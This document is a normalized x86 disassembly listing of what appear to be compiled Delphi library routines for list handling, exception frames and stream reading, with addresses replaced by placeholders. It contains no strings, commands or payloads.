call sub_413f38
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx ebx
call sub_413eec
sub_416acc
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x14 ]
xor edx edx
push ebp
push sub_416c65
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ rw-data ]
call sub_414404
mov edi eax
xor edx edx
push ebp
push sub_416c46
push [ fs : edx ]
mov [ fs : edx ] esp
cmp [ edi + 0x8 ] 0x0
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_416c4d
mov eax [ rw-data ]
call sub_414468
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_403168
mov [ ebp - 0x4 ] eax
xor edx edx
push ebp
push sub_416c27
push [ fs : edx ]
mov [ fs : edx ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_403168
mov [ ebp - 0x8 ] eax
xor edx edx
push ebp
push sub_416bd5
push [ fs : edx ]
mov [ fs : edx ] esp
xor esi esi
jmp r-xdata
cmp esi [ edi + 0x8 ]
jl r-xdata
mov edx esi
mov eax edi
call sub_414098
mov ebx eax
mov eax [ ebx + 0x10 ]
call sub_413b94
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_416bdc
mov eax [ ebp - 0x8 ]
call sub_403198
retn
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov edx [ ebx + 0xc ]
mov eax [ ebx + 0x4 ]
call sub_410e84
test eax eax
je r-xdata
push ebp
mov eax [ ebx + 0x4 ]
call sub_416a4c
pop ecx
mov edx esi
mov eax edi
call sub_413f38
mov eax ebx
call sub_403198
jmp r-xdata
mov edx [ ebx + 0x14 ]
mov eax [ ebp - 0xc ]
call sub_416984
mov edx eax
mov eax ebx
mov ecx [ eax ]
call [ ecx ]
push ebp
mov eax [ ebx + 0x4 ]
call sub_416a84
pop ecx
inc esi
sub_416bdc
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_403198
retn
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
and [ edi + 0x1c ] 0xff7f
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_414098
mov edi eax
mov eax edi
mov edx [ r-xdata ]
call sub_403324
test al al
je r-xdata
sub_416c74
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
cmp [ rw-data ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ rw-data ]
call sub_414404
mov edi eax
xor eax eax
push ebp
push sub_416d0f
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ edi + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_414468
retn
mov edx ebx
mov eax edi
call sub_414098
mov esi eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov eax [ esi + 0x8 ]
cmp eax [ ebp - 0x4 ]
jne r-xdata
mov edx ebx
mov eax edi
call sub_413f38
mov eax esi
call sub_403198
mov edx [ esi + 0x10 ]
mov eax [ ebp - 0x8 ]
call sub_407d04
test al al
je r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
sub_416d20
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
cmp [ rw-data ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ rw-data ]
call sub_414404
mov edi eax
xor eax eax
push ebp
push sub_416d97
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ edi + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_414468
retn
mov edx ebx
mov eax edi
call sub_414098
mov esi eax
mov eax [ esi + 0x4 ]
cmp eax [ ebp - 0x4 ]
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx ebx
mov eax edi
call sub_413f38
mov eax esi
call sub_403198
sub_416dc8
push ebx
add esp 0xfffffff8
mov ebx eax
mov [ esp ] ebx
mov [ esp + 0x4 ] 0xb
push esp
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bac0
call sub_403924
pop ecx
pop edx
pop ebx
retn
sub_416e0c
push ebx
push esi
push edi
call sub_403524
mov ebx edx
mov esi eax
mov edx [ esi + 0x10 ]
sub edx [ esi + 0x14 ]
mov eax [ esi + 0x4 ]
mov cx 0x1
mov edi [ eax ]
call [ edi + 0x14 ]
mov edx ebx
and dl 0xfc
mov eax esi
call sub_41674c
test bl bl
jle r-xdata
pop edi
pop esi
pop ebx
retn
mov eax esi
call sub_40350c
sub_416e48
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
call sub_418d20
cmp bl al
je r-xdata
pop esi
pop ebx
retn
dec [ esi + 0x10 ]
mov eax esi
call sub_418e30
call sub_416dbc
sub_416e6c
push ebp
mov ebp esp
push ebx
push esi
mov esi edx
mov ebx eax
mov edx [ ebx + 0x70 ]
mov eax esi
call sub_407d04
test al al
je r-xdata
pop esi
pop ebx
pop ebp
retn 0x10
cmp [ ebp + 0x12 ] 0x0
je r-xdata
mov edx ebx
mov eax [ ebp + 0x14 ]
call [ ebp + 0x10 ]
lea eax [ ebx + 0x70 ]
call sub_403ee8
sub_416ea0
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x70 ]
mov eax ebx
call sub_407d04
test al al
je r-xdata
pop ebx
mov esp ebp
pop ebp
retn 0x10
cmp [ ebp + 0x12 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_418d20
cmp al 0xa
je r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_403168
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_416f61
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0xc ]
mov ecx 0x4
mov eax [ ebp - 0x4 ]
call sub_4172e4
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x4 ]
mov eax [ ebp - 0x8 ]
mov edx [ eax + 0x4 ]
mov ecx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_4172e4
mov eax [ ebp - 0x4 ]
mov [ eax + 0x78 ] 0x1
mov edx [ ebp - 0x8 ]
mov eax [ ebp + 0x14 ]
call [ ebp + 0x10 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_416f68
mov eax [ ebp - 0x8 ]
call sub_403198
retn
mov eax [ ebp - 0x4 ]
dec [ eax + 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_418e30
mov eax [ ebp - 0x4 ]
mov [ eax + 0x78 ] 0x1
call sub_416dbc
sub_416f90
push ebx
push ecx
mov [ esp ] 0x0
cmp [ eax + 0x5a ] 0x0
je r-xdata
mov al [ esp ]
pop edx
pop ebx
retn
push esp
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x5c ]
call [ ebx + 0x58 ]
sub_416fb0
push ebx
push esi
push edi
add esp 0xfffffef8
mov esi ecx
mov edi edx
mov ebx eax
lea eax [ esp + 0x8 ]
mov edx esi
mov ecx 0xff
call sub_404184
lea edx [ esp + 0x8 ]
mov eax [ edi ]
call sub_40341c
mov [ esp ] eax
cmp [ esp ] 0x0
sete [ esp + 0x4 ]
cmp [ ebx + 0x3a ] 0x0
je r-xdata
cmp [ esp + 0x4 ] 0x0
je r-xdata
push esp
lea eax [ esp + 0x8 ]
push eax
mov ecx esi
mov edx ebx
mov eax [ ebx + 0x3c ]
call [ ebx + 0x38 ]
mov eax [ esp ]
add esp 0x108
pop edi
pop esi
pop ebx
retn
call sub_416dbc
sub_417018
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi eax
mov eax [ rw-data ]
call sub_414404
mov esi eax
xor edx edx
push ebp
push sub_417088
push [ fs : edx ]
mov [ fs : edx ] esp
mov ebx [ esi + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41708f
mov eax [ rw-data ]
call sub_414468
retn
mov edx ebx
mov eax esi
call sub_414098
mov edx [ eax + 0x4 ]
cmp edx [ edi + 0x4 ]
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx [ eax + 0xc ]
cmp edx [ edi + 0xc ]
jne r-xdata
call sub_403198
mov edx ebx
mov eax esi
call sub_413f38
sub_417094
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
xor edx edx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_4171a3
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
test eax eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4171aa
lea eax [ ebp - 0x8 ]
call sub_403ee8
retn
xor edx edx
push ebp
push sub_417186
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_4171d8
retn
inc eax
mov [ ebp - 0xc ] eax
xor esi esi
mov edx edi
mov eax ebx
mov ecx [ eax ]
call [ ecx ]
mov eax ebx
call sub_4168a8
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
mov edx esi
call sub_414098
mov ebx eax
lea eax [ ebp - 0x8 ]
mov edx [ ebx + 0x14 ]
call sub_403f80
lea edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x20 ]
mov eax [ ebx + 0x8 ]
mov edx [ ebp - 0x8 ]
call sub_416984
mov edi eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
mov edx esi
call sub_414098
call sub_417018
test edi edi
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
mov edx esi
call sub_414098
mov edx eax
mov eax [ rw-data ]
call sub_41437c
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
xor ecx ecx
mov edx esi
call sub_41418c
jmp r-xdata
inc esi
dec [ ebp - 0xc ]
jne r-xdata
sub_4171b4
push ebx
mov ebx eax
mov eax ebx
call sub_4172a8
cdq
push edx
push eax
mov eax [ ebx + 0x4 ]
call sub_415d10
xor eax eax
mov [ ebx + 0x10 ] eax
xor eax eax
mov [ ebx + 0x14 ] eax
pop ebx
retn
sub_4171d8
push ebx
push esi
push edi
mov ebx eax
mov eax [ ebx + 0x30 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov eax [ ebx + 0x30 ]
call sub_403198
xor eax eax
mov [ ebx + 0x30 ] eax
inc esi
xor edi edi
mov edx edi
mov eax [ ebx + 0x30 ]
call sub_414098
call sub_403198
inc edi
dec esi
jne r-xdata
sub_417214
push ebx
push esi
push edi
push ebp
add esp 0xfffffff4
mov [ esp + 0x4 ] ecx
mov [ esp ] eax
mov eax edx
call sub_4030e0
mov ebp eax
jmp r-xdata
cmp ebp [ r-xdata ]
jne r-xdata
mov eax ebp
call sub_4136a8
mov esi eax
test esi esi
je r-xdata
mov eax [ esp ]
mov eax [ eax + 0x74 ]
test eax eax
je r-xdata
mov eax ebp
call sub_403124
mov ebp eax
movsx ebx [ esi ]
dec ebx
test ebx ebx
jl r-xdata
mov eax [ esp + 0x4 ]
call sub_413720
mov edi eax
mov edx [ esp + 0x4 ]
call sub_413620
mov edi eax
jmp r-xdata
inc ebx
mov [ esp + 0x8 ] 0x0
mov eax edi
add esp 0xc
pop ebp
pop edi
pop esi
pop ebx
retn
inc [ esp + 0x8 ]
dec ebx
jne r-xdata
mov eax [ esp + 0x8 ]
mov eax [ esi + eax * 4 + 0x2 ]
mov edi [ eax ]
mov edx [ esp + 0x4 ]
mov eax edi
call sub_4030fc
test al al
jne r-xdata
sub_4172e4
push esi
push edi
push ebx
mov edi edx
mov ebx ecx
mov esi eax
jmp r-xdata
or ebx ebx
jne r-xdata
mov ecx [ esi + 0x14 ]
sub ecx [ esi + 0x10 ]
ja r-xdata
pop ebx
pop edi
pop esi
retn
cmp ecx ebx
jb r-xdata
mov eax esi
call sub_417330
mov ecx [ esi + 0x14 ]
push esi
sub ebx ecx
mov eax [ esi + 0x8 ]
add eax [ esi + 0x10 ]
add [ esi + 0x10 ] ecx
mov esi eax
mov edx ecx
shr ecx 0x2
cld
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
pop esi
mov ecx ebx
sub_417330
push ebx
push esi
mov ebx eax
mov edx [ ebx + 0x8 ]
mov ecx [ ebx + 0xc ]
mov eax [ ebx + 0x4 ]
mov esi [ eax ]
call [ esi + 0xc ]
mov esi eax
mov [ ebx + 0x14 ] esi
test esi esi
jne r-xdata
xor eax eax
mov [ ebx + 0x10 ] eax
pop esi
pop ebx
retn
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40ba84
call sub_403924
sub_417380
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_4173cb
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_418b80
mov eax [ ebp - 0x4 ]
call sub_4041a8
dec eax
jle r-xdata
mov eax [ ebp - 0x4 ]
mov bl [ eax ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4173d2
lea eax [ ebp - 0x4 ]
call sub_403ee8
retn
call sub_416dbc
sub_4173d8
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x20 ]
xor eax eax
push ebp
push sub_417478
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_416f7c
test al al
jne r-xdata
mov eax ebx
call sub_416f7c
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_4148d0
jmp r-xdata
mov eax ebx
call sub_4172c0
add al 0xfe
sub al 0x3
jae r-xdata
mov eax ebx
call sub_417ee8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41747f
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x24 ]
retn
mov eax [ ebp - 0x4 ]
call sub_4148b0
mov esi eax
mov eax ebx
call sub_417ee0
jmp r-xdata
mov eax ebx
call sub_417e30
mov eax ebx
call sub_416f7c
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_41804c
mov eax ebx
call sub_417ee8
sub_4174a8
push ebp
mov ebp esp
push ebx
push esi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_404d5c
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
pop esi
pop ebx
pop ebp
retn
inc ebx
xor esi esi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ eax + esi * 4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x34 ]
call sub_413eec
inc esi
dec ebx
jne r-xdata
sub_4174e4
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi eax
mov eax edi
call sub_41a074
mov esi eax
dec esi
test esi esi
jl r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
inc esi
xor ebx ebx
inc ebx
dec esi
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_404d5c
inc eax
push eax
mov eax [ ebp + 0x8 ]
add eax 0xfffffffc
mov ecx 0x1
mov edx [ r-xdata ]
call sub_404f18
add esp 0x4
mov edx ebx
mov eax edi
call sub_41a048
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_404d5c
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
pop ecx
mov [ edx + eax * 4 - 0x4 ] ecx
mov edx ebx
mov eax edi
call sub_41a048
test [ eax + 0x24 ] 0x4
je r-xdata
sub_41755c
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x3 ] dl
mov [ ebp - 0x2 ] ax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_404d5c
mov esi eax
dec esi
test esi esi
jl r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
inc esi
xor ebx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edi [ eax + ebx * 4 ]
mov ax [ ebp - 0x2 ]
not eax
and ax [ edi + 0x1c ]
mov edx [ ebp + 0x8 ]
mov [ edi + 0x1c ] ax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edi [ eax + ebx * 4 ]
mov ax [ edi + 0x1c ]
or ax [ ebp - 0x2 ]
mov edx [ ebp + 0x8 ]
mov [ edi + 0x1c ] ax
jmp r-xdata
cmp [ ebp - 0x3 ] 0x0
je r-xdata
inc ebx
dec esi
jne r-xdata
sub_4175c4
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
test [ eax - 0x9 ] 0x1
jne r-xdata
xor eax eax
pop ebp
retn
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x10 ] 0x0
je r-xdata
mov al 0x1
pop ebp
retn
sub_4175e4
push ebp
mov ebp esp
push ebx
push esi
mov esi eax
xor ebx ebx
call sub_40276c
mov edx [ r-xdata ]
call sub_403324
test al al
je r-xdata
mov eax ebx
pop esi
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
push eax
call sub_4175c4
pop ecx
test al al
je r-xdata
xor eax eax
mov [ esi ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
xor edx edx
call sub_419014
call sub_40276c
mov edx [ eax + 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov ebx eax
mov eax [ esi ]
call sub_403198
sub_417644
push ebp
mov ebp esp
push ebx
push esi
push edi
xor eax eax
push ebp
push sub_41772a
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x18 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_4191b4
mov ebx eax
mov eax [ ebp + 0x8 ]
xor edx edx
mov [ eax - 0x14 ] edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
cmp [ eax + 0x6a ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x14 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
add eax 0xffffffec
push eax
mov eax [ ebp + 0x8 ]
mov esi [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov ecx ebx
mov eax [ esi + 0x6c ]
call [ esi + 0x68 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
or [ eax + 0x1c ] 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax ebx
call [ eax - 0xc ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x14 ] eax
mov eax [ ebp + 0x8 ]
test [ eax - 0x9 ] 0x4
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
xor eax eax
push ebp
push sub_4176fe
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov ecx [ eax + 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
or edx 0xffffffff
mov ebx [ eax ]
call [ ebx + 0x2c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
or [ eax + 0x1c ] 0x1
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
or [ eax + 0x1c ] 0x200
sub_41772f
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
add eax 0xffffffec
call sub_4175e4
pop ecx
test al al
jne r-xdata
call sub_4039a0
pop edi
pop esi
pop ebx
pop ebp
retn
call sub_40394c
sub_417754
push ebp
mov ebp esp
push ebx
push esi
push edi
xor eax eax
push ebp
push sub_4177cc
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ eax + 0x2c ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
mov si 0xfff8
call sub_403394
mov eax [ ebp + 0x8 ]
lea ecx [ eax - 0x1c ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x14 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0x1c ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
test [ eax + 0x1c ] 0x10
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x1c ]
call sub_413b94
mov edx [ ebp + 0x8 ]
cmp eax [ edx - 0x14 ]
jne r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
or [ eax + 0x1c ] 0x200
sub_4177d1
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
add eax 0xffffffec
call sub_4175e4
pop ecx
test al al
jne r-xdata
call sub_4039a0
pop edi
pop esi
pop ebx
pop ebp
retn
call sub_40394c
sub_4177f4
push ebp
mov ebp esp
push ebx
push esi
push edi
xor eax eax
push ebp
push sub_41786f
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x18 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_4191b4
mov ecx eax
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x1c ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0x14 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x14 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
mov si 0xfff2
call sub_403394
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov [ eax + 0x2c ] ebx
mov eax [ ebp + 0x8 ]
test ebx ebx
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x18 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
mov [ edx + 0x2c ] eax
pop edi
pop esi
pop ebx
pop ebp
retn
sub_417874
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
add eax 0xffffffec
call sub_4175e4
pop ecx
test al al
jne r-xdata
call sub_4039a0
pop edi
pop esi
pop ebx
pop ebp
retn
call sub_40394c
sub_417898
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x18 ] ecx
mov [ ebp - 0x1c ] ecx
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0x10 ] edx
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_417ab9
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0x20 ]
lea edx [ ebp - 0x9 ]
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0x24 ]
lea edx [ ebp - 0x18 ]
mov eax [ ebp - 0x8 ]
call sub_418b44
lea edx [ ebp - 0x1c ]
mov eax [ ebp - 0x8 ]
call sub_418b44
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x2c ]
mov [ ebp - 0x24 ] eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x1c ]
mov [ ebp - 0x28 ] eax
xor eax eax
push ebp
push sub_417a89
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x10 ]
mov [ ebp - 0x14 ] eax
cmp [ ebp - 0x14 ] 0x0
jne r-xdata
cmp [ ebp - 0x14 ] 0x0
je r-xdata
test [ ebp - 0x9 ] 0x1
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x24 ]
mov [ eax + 0x2c ] edx
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x28 ]
mov [ eax + 0x1c ] edx
retn
xor eax eax
push ebp
push sub_417a47
push [ fs : eax ]
mov [ fs : eax ] esp
push ebp
mov eax [ ebp - 0x14 ]
call sub_4174e4
pop ecx
mov eax [ ebp - 0x14 ]
or [ eax + 0x1c ] 0x1
push ebp
mov dl 0x1
mov ax [ r-xdata ]
call sub_41755c
pop ecx
test [ ebp - 0x9 ] 0x1
jne r-xdata
push ebp
call sub_417644
pop ecx
push ebp
call sub_4177f4
pop ecx
jmp r-xdata
cmp [ ebp - 0x14 ] 0x0
jne r-xdata
push ebp
call sub_417754
pop ecx
mov eax [ ebp - 0x14 ]
test [ eax + 0x1d ] 0x2
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
call sub_4039d0
jmp r-xdata
mov eax [ ebp - 0x14 ]
or [ eax + 0x1c ] 0x2
push ebp
mov dl 0x1
mov ax [ r-xdata ]
call sub_41755c
pop ecx
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x14 ]
mov eax [ ebp - 0x14 ]
and [ eax + 0x1c ] 0xfffd
push ebp
xor edx edx
mov ax [ r-xdata ]
call sub_41755c
pop ecx
test [ ebp - 0x9 ] 0x2
je r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x14 ]
mov [ eax + 0x1c ] edx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_417ac0
lea eax [ ebp - 0x1c ]
mov edx 0x2
call sub_403f0c
lea eax [ ebp - 0x4 ]
mov edx [ r-xdata ]
call sub_404f24
retn
test [ ebp - 0x9 ] 0x1
jne r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x2c ]
mov ecx [ ebp - 0x20 ]
mov edx [ ebp - 0x14 ]
mov si 0xfff9
call sub_403394
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x34 ]
mov edx [ ebp - 0x14 ]
call sub_4140f4
test eax eax
jge r-xdata
mov eax [ ebp - 0x14 ]
test [ eax + 0x1d ] 0x2
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
push ebp
mov eax [ ebp - 0x14 ]
call sub_4174a8
pop ecx
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x34 ]
mov edx [ ebp - 0x14 ]
call sub_413eec
jmp r-xdata
push ebp
mov eax [ ebp - 0x14 ]
call sub_4174a8
pop ecx
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x34 ]
mov edx [ ebp - 0x14 ]
call sub_413eec
sub_417a4c
push ebp
call sub_4175c4
pop ecx
test al al
je r-xdata
call sub_40394c
call sub_4039a0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x24 ]
mov [ eax + 0x2c ] edx
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x28 ]
mov [ eax + 0x1c ] edx
retn
mov eax [ ebp - 0x14 ]
call sub_403198
sub_417ad4
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x30 ] 0x0
jne r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_417b44
pop ebx
pop ecx
pop ebp
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_403168
mov edx [ ebp - 0x4 ]
mov [ edx + 0x30 ] eax
xor eax eax
push ebp
push sub_417b2f
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_417b44
mov eax [ ebp - 0x4 ]
call sub_417094
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_4171d8
retn
sub_417b44
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov ebx edx
mov [ ebp - 0x4 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
